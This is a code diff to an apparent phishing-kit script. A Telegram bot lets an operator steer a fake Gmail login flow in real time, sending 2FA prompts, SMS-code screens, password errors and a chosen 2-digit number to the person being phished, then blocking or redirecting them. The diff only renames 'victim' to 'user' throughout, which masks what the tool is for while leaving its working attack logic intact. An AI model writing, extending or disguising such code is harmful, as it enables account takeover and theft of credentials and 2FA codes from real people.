@@ -65,7 +65,7 @@ def send_telegram_2fa_grid():
             row = []
     if row:
         rows.append(row)
-    send_telegram_buttons("🔢 Choose the 2-digit number to show the victim:", rows)
+    send_telegram_buttons("🔢 Choose the 2-digit number to show the user:", rows)
 
 def send_main_controls():
     buttons = [
@@ -75,7 +75,7 @@ def send_main_controls():
         [{"text": "❌ Password Error", "callback_data": "password_error"}],
         [{"text": "🚫 Block Visitor", "callback_data": "block"}, {"text": "✅ Success", "callback_data": "success"}]
     ]
-    send_telegram_buttons("🎮 **Gmail Flow Controls**\nSelect what to show the victim:", buttons)
+    send_telegram_buttons("🎮 **Gmail Flow Controls**\nSelect what to show the user:", buttons)
 
 def init_gmail_state():
     if os.path.exists(GMAIL_STATE_DB):
@@ -144,48 +144,48 @@ def handle_telegram_updates():
                         state["step"] = "prompt"
                         state["timestamp"] = datetime.now().isoformat()
                         save_gmail_state(state)
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "✅ Prompt sent to victim. Waiting for Yes/No response..."})
-                        send_telegram("✅ Google Prompt sent to victim's page!")
+                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "✅ Prompt sent to user. Waiting for Yes/No response..."})
+                        send_telegram("✅ Google Prompt sent to user's page!")
                         send_main_controls()
                     elif cb_data == "sms1":
                         state = init_gmail_state()
                         state["step"] = "sms1"
                         state["timestamp"] = datetime.now().isoformat()
                         save_gmail_state(state)
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "📱 SMS Code I sent to victim"})
-                        send_telegram("📱 SMS Code I sent to victim's page!")
+                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "📱 SMS Code I sent to user"})
+                        send_telegram("📱 SMS Code I sent to user's page!")
                         send_main_controls()
                     elif cb_data == "sms2":
                         state = init_gmail_state()
                         state["step"] = "sms2"
                         state["timestamp"] = datetime.now().isoformat()
                         save_gmail_state(state)
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "📱 SMS Code II sent to victim"})
-                        send_telegram("📱 SMS Code II sent to victim's page!")
+                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "📱 SMS Code II sent to user"})
+                        send_telegram("📱 SMS Code II sent to user's page!")
                         send_main_controls()
                     elif cb_data == "password_error":
                         state = init_gmail_state()
                         state["step"] = "error"
                         state["timestamp"] = datetime.now().isoformat()
                         save_gmail_state(state)
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "❌ Password error shown to victim"})
-                        send_telegram("❌ Password error shown to victim!")
+                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "❌ Password error shown to user"})
+                        send_telegram("❌ Password error shown to user!")
                         send_main_controls()
                     elif cb_data == "block":
                         state = init_gmail_state()
                         state["step"] = "blocked"
                         state["timestamp"] = datetime.now().isoformat()
                         save_gmail_state(state)
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "🚫 Victim blocked"})
-                        send_telegram("🚫 Victim is now blocked!")
+                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "🚫 User blocked"})
+                        send_telegram("🚫 User is now blocked!")
                         send_main_controls()
                     elif cb_data == "success":
                         state = init_gmail_state()
                         state["step"] = "success"
                         state["timestamp"] = datetime.now().isoformat()
                         save_gmail_state(state)
-                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "✅ Success! Redirecting victim..."})
-                        send_telegram("✅ Victim redirected to success page!")
+                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "✅ Success! Redirecting user..."})
+                        send_telegram("✅ User redirected to success page!")
                         send_main_controls()
                     elif cb_data == "show_2fa_menu":
                         requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "🔢 Loading 2FA grid..."})
@@ -199,13 +199,13 @@ def handle_telegram_updates():
                         state["timestamp"] = datetime.now().isoformat()
                         save_gmail_state(state)
                         requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": f"🔢 Showing 2FA code: {number}"})
-                        send_telegram(f"🔢 Showing 2FA code **{number}** to victim!")
+                        send_telegram(f"🔢 Showing 2FA code **{number}** to user!")
                         send_main_controls()
                 elif "message" in update:
                     msg = update["message"]
                     text = msg.get("text", "").strip()
                     if text == "/start":
-                        send_telegram("🤖 **Gmail Flow Control Bot**\n\nUse the buttons below to control the victim's Gmail login flow:")
+                        send_telegram("🤖 **Gmail Flow Control Bot**\n\nUse the buttons below to control the user's Gmail login flow:")
                         send_main_controls()
                     elif text == "/controls" or text == "/menu":
                         send_main_controls()
